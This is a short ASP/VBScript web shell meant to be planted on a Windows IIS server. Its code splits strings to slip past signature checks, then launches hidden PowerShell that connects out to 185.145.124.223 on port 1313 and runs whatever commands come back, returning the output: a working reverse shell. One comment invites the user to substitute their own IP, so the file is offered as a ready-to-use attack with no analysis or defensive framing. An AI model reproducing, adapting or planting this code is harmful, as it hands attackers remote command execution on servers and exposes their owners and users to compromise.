<%@ Language=VBScript %>
<%
Dim h, p, s, e
' Replace 185.145.124.223 with your bind shell IP and the port 1313 as well
h = "185" & "." & "145" & "." & "124" & "." & "223"
p = 1313

Set s = CreateObject("W" & "Script" & "." & "Shell")

' Execute a command to initiate the reverse shell
e = s.Run("cmd" & "." & "exe /C powershell -c ""$c = New-Object System" & "." & "Net" & "." & "Sockets" & "." & "TCPClient('" & h & "', " & p & "); $s = $c.GetStream(); [byte[]]$b = 0..65535|%{0}; while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$d = (New-Object -TypeName System" & "." & "Text" & "." & "ASCIIEncoding).GetString($b,0, $i); $sb = (iex $d 2>&1 | Out-String ); $sb2 = $sb + 'PS ' + (pwd).Path + '> '; $sendb = ([text.encoding]::ASCII).GetBytes($sb2); $s.Write($sendb,0,$sendb.Length); $s.Flush()}; $c.Close()""", 0, True)

Set s = Nothing
%>
